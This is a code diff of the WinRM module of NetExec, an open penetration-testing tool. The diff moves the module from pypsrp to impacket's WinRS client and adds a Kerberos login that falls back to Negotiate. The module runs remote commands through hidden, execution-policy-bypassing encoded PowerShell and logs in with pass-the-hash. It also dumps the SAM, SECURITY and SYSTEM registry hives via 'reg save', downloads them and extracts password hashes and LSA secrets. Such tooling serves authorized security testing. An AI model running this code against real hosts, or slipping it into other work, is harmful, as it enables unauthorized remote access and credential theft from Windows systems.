@@ -1,16 +1,14 @@
 import os
 import base64
 import binascii
+import html
+import re
+import traceback
 import requests
 import urllib3
-import logging
 import ntpath
-import xml.etree.ElementTree as ET
-
-from pypsrp.wsman import NAMESPACES
-from pypsrp.client import Client
-from pypsrp.powershell import PSDataStreams
 from termcolor import colored
+import xml.etree.ElementTree as ET
 
 from dploot.lib.network.winrm import WINRMTarget as Target
 from impacket.examples.secretsdump import LocalOperations, LSASecrets, SAMHashes
@@ -23,13 +21,98 @@ from nxc.helpers.misc import gen_random_string, sanitize_dns
 from nxc.helpers.negotiate_parser import parse_challenge
 from nxc.logger import NXCAdapter
 
+from impacket.winrm import (
+    KerberosTransport,
+    NegotiateTransport,
+    NTCredential,
+    WinRSClient,
+    WinRMAuthError,
+    WinRMFaultError,
+    WinRMTransportError,
+    get_kerberos_credential,
+    _build_envelope
+)
+
+
 urllib3.disable_warnings()
+
+WSMAN_ENUMERATE_ACTION = "http://schemas.xmlsoap.org/ws/2004/09/enumeration/Enumerate"
+WSMAN_SHELL_RESOURCE_URI = "http://schemas.microsoft.com/wbem/wsman/1/windows/shell"
+WSEN_NAMESPACE = "http://schemas.xmlsoap.org/ws/2004/09/enumeration"
+WSMAN_NAMESPACE = "http://schemas.dmtf.org/wbem/wsman/1/wsman.xsd"
+
+
+def parse_hashes(hashes):
+    if not hashes:
+        return "", ""
+
+    if ":" in hashes:
+        lmhash, nthash = hashes.split(":", 1)
+        return lmhash, nthash
+
+    return "", hashes
+
+
+def build_command(command, shell_type):
+    if shell_type == "powershell":
+        command = f'$ProgressPreference="SilentlyContinue";{command}'
+        encoded = base64.b64encode(command.encode("utf-16le")).decode("ascii")
+        return "powershell.exe", ["-NoP", "-NoL", "-sta", "-NonI", "-W", "Hidden", "-Exec", "Bypass", "-Enc", encoded]
+    # The WinRS shell already runs the command line through cmd.exe /c
+    return command, []
+
+
+def parse_clixml(stderr):
+    """powershell.exe writes its error stream to stderr as CLIXML, keep the error messages only"""
+    if not stderr.startswith("#< CLIXML"):
+        return stderr
+    errors = html.unescape("".join(re.findall(r'<S S="Error">(.*?)</S>', stderr, re.DOTALL)))
+    return re.sub(r"_x([0-9A-F]{4})_", lambda match: chr(int(match[1], 16)), errors)
+
+
+def build_admin_check_request(timeout=20, session_id=None):
+    envelope, header, body = _build_envelope("create", resource_uri=WSMAN_SHELL_RESOURCE_URI, timeout=timeout, session_id=session_id)
+
+    action = header.find("{http://schemas.xmlsoap.org/ws/2004/08/addressing}Action")
+
+    if action is None:
+        raise WinRMTransportError("Unable to find WS-Man Action header")
+    action.text = WSMAN_ENUMERATE_ACTION
+    enumerate_msg = ET.SubElement(body, f"{{{WSEN_NAMESPACE}}}Enumerate")
+    ET.SubElement(enumerate_msg, f"{{{WSMAN_NAMESPACE}}}OptimizeEnumeration")
+    ET.SubElement(enumerate_msg, f"{{{WSMAN_NAMESPACE}}}MaxElements").text = "32000"
+
+    return envelope
+
+
+class KerberosFallbackTransport:
+    """Kerberos transport which retries through Negotiate when GSS fails."""
+
+    def __init__(self, url, credentials):
+        self.url = url
+        self.credentials = credentials
+        self.transport = KerberosTransport(url, credentials)
+        self.fallback_attempted = False
+
+    def send(self, request):
+        try:
+            return self.transport.send(request)
+        except WinRMAuthError:
+            if self.fallback_attempted:
+                raise
+
+            self.fallback_attempted = True
+            self.transport.close()
+            self.transport = NegotiateTransport(self.url, self.credentials)
+            return self.transport.send(request)
+
+    def close(self):
+        self.transport.close()
 
 
 class winrm(connection):
     def __init__(self, args, db, host):
         self.domain = ""
-        self.targedDomain = ""
         self.server_os = None
         self.endpoint = None
         self.lmhash = ""
@@ -46,9 +129,6 @@ class winrm(connection):
         connection.__init__(self, args, db, host)
 
     def proto_logger(self):
-        # For more details, please check the function "print_host_info"
-        logging.getLogger("pypsrp").disabled = True
-        logging.getLogger("pypsrp.wsman").disabled = True
         self.logger = NXCAdapter(
             extra={
                 "protocol": "WINRM",
@@ -64,17 +144,16 @@ class winrm(connection):
         except Exception as e:
             self.logger.debug(f"Error parsing NTLM challenge: {e!s}")
             self.logger.debug(f"Raw challenge: {self.challenge_header.split(' ')[1].replace(',', '')[:20]}...")
-            self.logger.error("Invalid NTLM challenge received from server. This may indicate NTLM is not supported and nxc winrm only support NTLM currently")
+            self.logger.error("Invalid NTLM challenge received from server. This may indicate NTLM is not supported, use Kerberos")
             self.no_ntlm = True
-            return False
-
-        dns_hostname = ntlm_info["dns_hostname"] or ""
-        hostname = ntlm_info["hostname"] or dns_hostname.split(".", 1)[0] or self.host
-        domain = ntlm_info["domain"] or (dns_hostname.split(".", 1)[1] if "." in dns_hostname else self.host)
-        self.hostname = sanitize_dns(hostname, self.logger)
-        self.targetDomain = self.domain = sanitize_dns(domain, self.logger)
-        self.server_os = ntlm_info["os_version"]
-        self.logger.extra["hostname"] = self.hostname
+        else:
+            dns_hostname = ntlm_info["dns_hostname"] or ""
+            hostname = ntlm_info["hostname"] or dns_hostname.split(".", 1)[0] or self.host
+            domain = ntlm_info["domain"] or (dns_hostname.split(".", 1)[1] if "." in dns_hostname else self.host)
+            self.hostname = sanitize_dns(hostname, self.logger)
+            self.targetDomain = self.domain = sanitize_dns(domain, self.logger)
+            self.server_os = ntlm_info["os_version"]
+            self.logger.extra["hostname"] = self.hostname
 
         try:
             self.db.add_host(self.host, self.port, self.hostname, self.targetDomain, self.server_os)
@@ -115,11 +194,7 @@ class winrm(connection):
         for protocol in self.args.check_proto:
             endpoints[protocol] = {}
             endpoints[protocol]["port"] = self.port[self.args.check_proto.index(protocol)] if len(self.port) == 2 else self.port[0]
-            endpoints[protocol]["url"] = "{}://{}:{}/wsman".format(
-                protocol,
-                self.host if not self.is_ipv6 else f"[{self.host}]",
-                endpoints[protocol]["port"]
-            )
+            endpoints[protocol]["url"] = f"{protocol}://{self.host if not self.is_ipv6 else f'[{self.host}]'}:{endpoints[protocol]['port']}/wsman"
             endpoints[protocol]["ssl"] = (protocol != "http")
 
         for protocol in endpoints:
@@ -128,7 +203,7 @@ class winrm(connection):
                 self.logger.debug(f"Requesting URL: {endpoints[protocol]['url']}")
                 res = requests.post(endpoints[protocol]["url"], headers=headers, verify=False, timeout=self.args.http_timeout)
                 self.logger.debug(f"Received response code: {res.status_code}")
-                self.challenge_header = res.headers["WWW-Authenticate"]
+                self.challenge_header = res.headers.get("WWW-Authenticate")
                 if (not self.challenge_header) or ("Negotiate" not in self.challenge_header):
                     self.logger.info('Failed to get NTLM challenge from target "/wsman" endpoint, maybe isn\'t winrm service.')
                     return False
@@ -145,40 +220,83 @@ class winrm(connection):
         return False
 
     def check_if_admin(self):
-        wsman = self.conn.wsman
-        wsen = NAMESPACES["wsen"]
-        wsmn = NAMESPACES["wsman"]
+        self.admin_privs = False
 
-        enum_msg = ET.Element(f"{{{wsen}}}Enumerate")
-        ET.SubElement(enum_msg, f"{{{wsmn}}}OptimizeEnumeration")
-        ET.SubElement(enum_msg, f"{{{wsmn}}}MaxElements").text = "32000"
+        try:
+            self.conn._send(build_admin_check_request(timeout=self.conn.timeout, session_id=self.conn.session_id))
+            self.admin_privs = True
 
-        wsman.enumerate("http://schemas.microsoft.com/wbem/wsman/1/windows/shell", enum_msg)
-        self.admin_privs = True
-        return True
+        except WinRMFaultError as e:
+            self.logger.debug(f"WinRM administrator check failed: {e!s}")
+
+        return self.admin_privs
+
+    def connect_winrs(self, username, password=None, hashes=None, use_cache=False):
+        self.disconnect()
+
+        # Like on main, --http-timeout only covers the probe: impacket's WinRS timeouts keep the socket (30s) above the operation timeout (20s)
+        lmhash, nthash = parse_hashes(hashes or "")
+        if self.kerberos:
+            credentials = get_kerberos_credential(f"HTTP/{self.hostname}", domain=self.domain, username=username, password=password or "", lmhash=lmhash, nthash=nthash, aes_key=self.aesKey, kdc_host=self.kdcHost, use_cache=use_cache)
+            transport = KerberosFallbackTransport(self.endpoint, credentials)
+        else:
+            credentials = NTCredential(domain=self.domain or "", username=username or "", password=password or "", lmhash=bytes.fromhex(lmhash) if lmhash else "", nthash=bytes.fromhex(nthash) if nthash else "")
+            transport = NegotiateTransport(self.endpoint, credentials)
+        self.conn = WinRSClient(transport)
+
+    def kerberos_login(self, domain, username, password="", ntlm_hash="", aesKey="", kdcHost="", useCache=False):
+        os.environ["NETBIOS_COMPUTER_NAME"] = self.hostname
+        self.admin_privs = False
+        self.domain = domain
+        self.username = username
+        self.password = password or ""
+        secret = aesKey or ntlm_hash or password
+        used_ccache = " from ccache" if useCache else f":{process_secret(secret)}"
+
+        try:
+            self.kdcHost = kdcHost or self.kdcHost
+            if aesKey:
+                self.aesKey = aesKey
+
+            self.connect_winrs(username, password=password, hashes=ntlm_hash, use_cache=useCache)
+
+            self.check_if_admin()
+            self.logger.success(f"{self.domain}\\{self.username}{used_ccache} {self.mark_pwned()}")
+
+            # The creds DB only holds passwords and NT hashes, not AES keys or ccache logins
+            if not aesKey and not useCache:
+                cred_type = "hash" if ntlm_hash else "plaintext"
+                self.db.add_credential(cred_type, domain, self.username, secret)
+                user_id = self.db.get_credential(cred_type, domain, self.username, secret)
+                host_id = self.db.get_hosts(self.host)[0].id
+                self.db.add_loggedin_relation(user_id, host_id)
+                if self.admin_privs:
+                    self.db.add_admin_user(cred_type, domain, self.username, secret, self.host, user_id=user_id)
+
+            if self.admin_privs:
+                add_user_bh(f"{self.hostname}$", domain, self.logger, self.config)
+
+            if self.username:
+                add_user_bh(self.username, self.domain, self.logger, self.config)
+            return True
+
+        except Exception as e:
+            self.logger.fail(f"{self.domain}\\{self.username}{used_ccache} {e!s}")
+            self.disconnect()
+            return False
 
     def plaintext_login(self, domain, username, password):
-        # Add server hostname to the Workstation field in NTLM Authenticate Message (Message 3)
-        # This helps fix false negatives during NTLM auth — see issue #694 for details
         os.environ["NETBIOS_COMPUTER_NAME"] = self.hostname
         self.admin_privs = False
         self.password = password
         self.username = username
         self.domain = domain
+
         try:
-            self.conn = Client(
-                self.host,
-                port=self.port,
-                auth="ntlm",
-                username=f"{self.domain}\\{self.username}",
-                password=self.password,
-                ssl=self.ssl,
-                cert_validation=False,
-            )
+            self.connect_winrs(username, password=password)
 
             self.check_if_admin()
             self.logger.success(f"{self.domain}\\{self.username}:{process_secret(self.password)} {self.mark_pwned()}")
-
             self.logger.debug(f"Adding credential: {domain}/{self.username}:{self.password}")
             self.db.add_credential("plaintext", domain, self.username, self.password)
             user_id = self.db.get_credential("plaintext", domain, self.username, self.password)
@@ -186,51 +304,34 @@ class winrm(connection):
             self.db.add_loggedin_relation(user_id, host_id)
 
             if self.admin_privs:
-                self.logger.debug("Inside admin privs")
-                self.db.add_admin_user("plaintext", domain, self.username, self.password, self.host, user_id=user_id)  # , user_id=user_id)
+                self.db.add_admin_user("plaintext", domain, self.username, self.password, self.host, user_id=user_id)
                 add_user_bh(f"{self.hostname}$", domain, self.logger, self.config)
 
             if not self.args.local_auth and self.username != "":
                 add_user_bh(self.username, self.domain, self.logger, self.config)
             return True
+
         except Exception as e:
-            if "with ntlm" in str(e):
+            if "status 401" in str(e):
                 self.logger.fail(f"{self.domain}\\{self.username}:{process_secret(self.password)}")
             else:
                 self.logger.fail(f"{self.domain}\\{self.username}:{process_secret(self.password)} {e!s}")
+            self.disconnect()
             return False
 
     def hash_login(self, domain, username, ntlm_hash):
-        # Add server hostname to the Workstation field in NTLM Authenticate Message (Message 3)
-        # This helps fix false negatives during NTLM auth — see issue #694 for details
         os.environ["NETBIOS_COMPUTER_NAME"] = self.hostname
         self.admin_privs = False
-        lmhash = "00000000000000000000000000000000"
-        nthash = ""
         self.username = username
-        # This checks to see if we didn't provide the LM Hash
-        if ntlm_hash.find(":") != -1:
-            lmhash, nthash = ntlm_hash.split(":")
-        else:
-            nthash = ntlm_hash
-
-        self.lmhash = lmhash
-        self.nthash = nthash
         self.domain = domain
+        # dploot's pypsrp session (--dpapi) only takes the hash in the LM:NT form
+        self.lmhash, self.nthash = ntlm_hash.split(":") if ":" in ntlm_hash else ("00000000000000000000000000000000", ntlm_hash)
 
         try:
-            self.conn = Client(
-                self.host,
-                port=self.port,
-                auth="ntlm",
-                username=f"{self.domain}\\{self.username}",
-                password=f"{self.lmhash}:{self.nthash}",
-                ssl=self.ssl,
-                cert_validation=False,
-            )
+            self.connect_winrs(username, hashes=ntlm_hash)
 
             self.check_if_admin()
-            self.logger.success(f"{self.domain}\\{self.username}:{process_secret(nthash)} {self.mark_pwned()}")
+            self.logger.success(f"{self.domain}\\{self.username}:{process_secret(self.nthash)} {self.mark_pwned()}")
 
             self.db.add_credential("hash", domain, self.username, ntlm_hash)
             user_id = self.db.get_credential("hash", domain, self.username, ntlm_hash)
@@ -238,7 +339,7 @@ class winrm(connection):
             self.db.add_loggedin_relation(user_id, host_id)
 
             if self.admin_privs:
-                self.db.add_admin_user("hash", domain, self.username, nthash, self.host, user_id=user_id)
+                self.db.add_admin_user("hash", domain, self.username, self.nthash, self.host, user_id=user_id)
                 add_user_bh(f"{self.hostname}$", domain, self.logger, self.config)
 
             if not self.args.local_auth and self.username != "":
@@ -246,76 +347,88 @@ class winrm(connection):
             return True
 
         except Exception as e:
-            if "with ntlm" in str(e):
+            if "status 401" in str(e):
                 self.logger.fail(f"{self.domain}\\{self.username}:{process_secret(self.nthash)}")
             else:
                 self.logger.fail(f"{self.domain}\\{self.username}:{process_secret(self.nthash)} {e!s}")
+            self.disconnect()
             return False
+
+    def disconnect(self):
+        if self.conn is not None:
+            self.conn.close()
+            self.conn = None
+
+    def run_command(self, command, shell_type="cmd"):
+        """Run a command in the WinRS shell and return its stdout, its stderr (error messages only for powershell) and its exit code"""
+        executable, arguments = build_command(command, shell_type)
+        output = self.conn.execute(executable, arguments=arguments).iter_output()
+        streams = {"stdout": b"", "stderr": b""}
+        try:
+            while True:
+                stream_name, data = next(output)
+                streams[stream_name] += data
+        except StopIteration as e:
+            exit_code = e.value
+        return streams["stdout"].decode(self.args.codec, errors="replace"), parse_clixml(streams["stderr"].decode(self.args.codec, errors="replace")), exit_code
 
     def execute(self, payload=None, get_output=False, shell_type="cmd"):
         if not payload:
             payload = self.args.execute
 
         try:
-            result = self.conn.execute_cmd(payload, encoding=self.args.codec) if shell_type == "cmd" else self.conn.execute_ps(payload)
+            stdout, stderr, exit_code = self.run_command(payload, shell_type)
         except Exception as e:
-            # Reference: https://github.com/diyan/pywinrm/issues/275
-            if hasattr(e, "code") and e.code == 5:
+            self.logger.debug(traceback.format_exc())
+            if isinstance(e, WinRMFaultError) and "AccessDenied" in e.code:
                 self.logger.fail(f"Execute command failed, current user: '{self.domain}\\{self.username}' has no 'Invoke' rights to execute command (shell type: {shell_type})")
-
-                if shell_type == "cmd":
-                    self.logger.info("Cannot execute command via cmd, the user probably does not have invoke rights with Root WinRM listener - now switching to Powershell to attempt execution")
-                    self.execute(payload, get_output, shell_type="powershell")
-            elif ("decode" in str(e)) and not get_output:
-                self.logger.success(f"Executed command (shell type: {shell_type})")
             else:
                 self.logger.fail(f"Execute command failed, error: {e!s}")
+            return None
+
+        if get_output:
+            return stdout
+        self.logger.success(f"Executed command (shell type: {shell_type})")
+        if self.args.no_output:
+            return None
+
+        if shell_type == "powershell":
+            if exit_code:
+                self.logger.fail("Error executing powershell command, non-zero return code")
+            for line in stderr.replace("\r", "").splitlines():
+                self.logger.fail(line.rstrip())
+            for line in stdout.replace("\r", "").splitlines():
+                self.logger.highlight(line.rstrip())
+        elif exit_code == 0:
+            for line in stdout.replace("\r", "").splitlines():
+                self.logger.highlight(line.rstrip())
         else:
-            if get_output:
-                return result[0]
-            self.logger.success(f"Executed command (shell type: {shell_type})")
-            if not self.args.no_output:
-                if shell_type == "powershell":
-                    result: tuple[str, PSDataStreams, bool]
-                    if result[2]:
-                        self.logger.fail("Error executing powershell command, non-zero return code")
-                    for out_type in ["debug", "verbose", "information", "progress", "warning", "error"]:
-                        stream: list[str] = getattr(result[1], out_type)
-                        for msg in stream:
-                            if str(msg) != "None":
-                                if out_type == "error":
-                                    self.logger.fail(str(msg).rstrip())
-                                else:
-                                    self.logger.display(str(msg).rstrip())
-                    # Display stdout
-                    for line in result[0].splitlines():
-                        self.logger.highlight(line.rstrip())
-                else:
-                    # Tuple of (stdout, stderr, returncode)
-                    result: tuple[str, str, int]
-                    if result[2] == 0:
-                        for line in result[0].replace("\r", "").splitlines():
-                            self.logger.highlight(line.rstrip())
-                    else:
-                        for line in result[1].replace("\r", "").splitlines():
-                            self.logger.fail(line.rstrip())
+            for line in stderr.replace("\r", "").splitlines():
+                self.logger.fail(line.rstrip())
+        return None
 
     def ps_execute(self, payload=None, get_output=False):
         command = payload if payload else self.args.ps_execute
-        result = self.execute(payload=command, get_output=get_output, shell_type="powershell")
-        if get_output:
-            return result
+        return self.execute(payload=command, get_output=get_output, shell_type="powershell")
+
+    def download_file(self, remote_path, local_path):
+        escaped = remote_path.replace("'", "''")
+        stdout, stderr, exit_code = self.run_command(f"[Convert]::ToBase64String([IO.File]::ReadAllBytes('{escaped}'))", "powershell")
+        if exit_code:
+            raise RuntimeError(stderr.strip().splitlines()[0])
+        with open(local_path, "wb") as fp:
+            fp.write(base64.b64decode("".join(stdout.split())))
 
     def get_file(self, remote_path=None, download_path=None):
         remote_path = remote_path if remote_path else self.args.get_file[0]
         local_path = download_path if download_path else self.args.get_file[1]
 
-        # Do a bit of smart handling for the local file path
         if local_path.endswith("/"):
             local_path += ntpath.basename(remote_path)
+
         try:
             self.logger.display(f'Downloading "{remote_path}" to "{local_path}"')
-            self.conn.fetch(remote_path, local_path)
+            self.download_file(remote_path, local_path)
             self.logger.success(f"File {remote_path} has been saved to {local_path}")
         except Exception as e:
             self.logger.fail(f"Failed to get file {remote_path}, error: {e!s}")
@@ -323,12 +436,16 @@ class winrm(connection):
     def put_file(self, local_path=None, remote_path=None):
         local_path = local_path if local_path else self.args.put_file[0]
         remote_path = remote_path if remote_path else self.args.put_file[1]
-
-        # Do a bit of smart handling for the remote file path
         remote_path += os.path.basename(local_path) if remote_path.endswith(("\\", "/")) else ""
+
         try:
             self.logger.display(f'Uploading "{local_path}" to "{remote_path}"')
-            self.conn.copy(local_path, remote_path)
+            with open(local_path, "rb") as fp:
+                encoded = base64.b64encode(fp.read()).decode("ascii")
+            escaped = remote_path.replace("'", "''")
+            _, stderr, exit_code = self.run_command(f"[IO.File]::WriteAllBytes('{escaped}', [Convert]::FromBase64String('{encoded}'))", "powershell")
+            if exit_code:
+                raise RuntimeError(stderr.strip().splitlines()[0])
             self.logger.success(f"File {local_path} has been uploaded to {remote_path}")
         except Exception as e:
             self.logger.fail(f"Failed to put file {local_path} to {remote_path}, error: {e!s}")
@@ -340,29 +457,22 @@ class winrm(connection):
             for line in out.splitlines():
                 self.logger.highlight(line.rstrip())
 
-    # Dos attack prevent:
-    # if someboby executed "reg save HKLM\sam C:\windows\temp\sam" before, but didn't remove "C:\windows\temp\sam" file,
-    # when user execute the same command next time, in tty shell, the prompt will ask "File C:\windows\temp\sam already exists. Overwrite (Yes/No)?"
-    # but in here, it isn't not a tty shell, pypsrp will do a crazy loop command execution when it didn't get any response (stuck in "Yes/No" prompt)
-    # and it will make target host OOM error just like dos attack.
-    # To prevent that, just make the store file name randomly.
     def sam(self):
         sam_storename = gen_random_string(6)
         system_storename = gen_random_string(6)
         dump_command = f"reg save HKLM\\SAM C:\\windows\\temp\\{sam_storename} && reg save HKLM\\SYSTEM C:\\windows\\temp\\{system_storename}"
         clean_command = f"del C:\\windows\\temp\\{sam_storename} & del C:\\windows\\temp\\{system_storename}"
         output_filename = self.output_file_template.format(output_folder="sam")
+
         try:
-            self.conn.execute_cmd(dump_command) if self.args.dump_method == "cmd" else self.conn.execute_ps(f"cmd /c '{dump_command}'")
-            self.conn.fetch(f"C:\\windows\\temp\\{sam_storename}", output_filename + ".sam")
-            self.conn.fetch(f"C:\\windows\\temp\\{system_storename}", output_filename + ".system")
+            _, stderr, exit_code = self.run_command(dump_command if self.args.dump_method == "cmd" else f"cmd /c '{dump_command}'", self.args.dump_method)
+            if exit_code:
+                self.logger.fail(f"Failed to dump SAM hashes, it may have been detected by AV or current user is not privileged user: {stderr.strip()}")
+                return
+            self.download_file(f"C:\\windows\\temp\\{sam_storename}", f"{output_filename}.sam")
+            self.download_file(f"C:\\windows\\temp\\{system_storename}", f"{output_filename}.system")
         except Exception as e:
-            if ("does not exist" in str(e)) or ("TransformFinalBlock" in str(e)):
-                self.logger.fail("Failed to dump SAM hashes, it may have been detected by AV or current user is not privileged user")
-            elif hasattr(e, "code") and e.code == 5:
-                self.logger.fail(f"Dump SAM hashes with {self.args.dump_method} failed, please try '--dump-method'")
-            else:
-                self.logger.fail(f"Failed to dump SAM hashes, error: {e!s}")
+            self.logger.fail(f"Failed to dump SAM hashes, error: {e!s}")
         else:
             self.logger.display("Dumping SAM hashes")
             local_operations = LocalOperations(f"{output_filename}.system")
@@ -377,7 +487,7 @@ class winrm(connection):
             SAM.export(output_filename)
         finally:
             try:
-                self.conn.execute_cmd(clean_command) if self.args.dump_method == "cmd" else self.conn.execute_ps(f"cmd /c '{clean_command}'")
+                self.run_command(clean_command if self.args.dump_method == "cmd" else f"cmd /c '{clean_command}'", self.args.dump_method)
             except Exception as e:
                 self.logger.fail(f"[OPSEC] Cleanup command failed, check C:\\windows\\temp\\{sam_storename} and C:\\windows\\temp\\{system_storename}: {e}")
 
@@ -387,17 +497,16 @@ class winrm(connection):
         dump_command = f"reg save HKLM\\SECURITY C:\\windows\\temp\\{security_storename} && reg save HKLM\\SYSTEM C:\\windows\\temp\\{system_storename}"
         clean_command = f"del C:\\windows\\temp\\{security_storename} & del C:\\windows\\temp\\{system_storename}"
         output_filename = self.output_file_template.format(output_folder="lsa")
+
         try:
-            self.conn.execute_cmd(dump_command) if self.args.dump_method == "cmd" else self.conn.execute_ps(f"cmd /c '{dump_command}'")
-            self.conn.fetch(f"C:\\windows\\temp\\{security_storename}", f"{output_filename}.security")
-            self.conn.fetch(f"C:\\windows\\temp\\{system_storename}", f"{output_filename}.system")
+            _, stderr, exit_code = self.run_command(dump_command if self.args.dump_method == "cmd" else f"cmd /c '{dump_command}'", self.args.dump_method)
+            if exit_code:
+                self.logger.fail(f"Failed to dump LSA secrets, it may have been detected by AV or current user is not privileged user: {stderr.strip()}")
+                return
+            self.download_file(f"C:\\windows\\temp\\{security_storename}", f"{output_filename}.security")
+            self.download_file(f"C:\\windows\\temp\\{system_storename}", f"{output_filename}.system")
         except Exception as e:
-            if ("does not exist" in str(e)) or ("TransformFinalBlock" in str(e)):
-                self.logger.fail("Failed to dump LSA secrets, it may have been detected by AV or current user is not privileged user")
-            elif hasattr(e, "code") and e.code == 5:
-                self.logger.fail(f"Dump LSA secrets with {self.args.dump_method} failed, please try '--dump-method'")
-            else:
-                self.logger.fail(f"Failed to dump LSA secrets, error: {e!s}")
+            self.logger.fail(f"Failed to dump LSA secrets, error: {e!s}")
         else:
             if not quiet:
                 self.logger.display("Dumping LSA secrets")
@@ -425,7 +534,7 @@ class winrm(connection):
             LSA.dumpSecrets()
         finally:
             try:
-                self.conn.execute_cmd(clean_command) if self.args.dump_method == "cmd" else self.conn.execute_ps(f"cmd /c '{clean_command}'")
+                self.run_command(clean_command if self.args.dump_method == "cmd" else f"cmd /c '{clean_command}'", self.args.dump_method)
             except Exception as e:
                 self.logger.fail(f"[OPSEC] Cleanup command failed, check C:\\windows\\temp\\{security_storename} and C:\\windows\\temp\\{system_storename}: {e}")
 
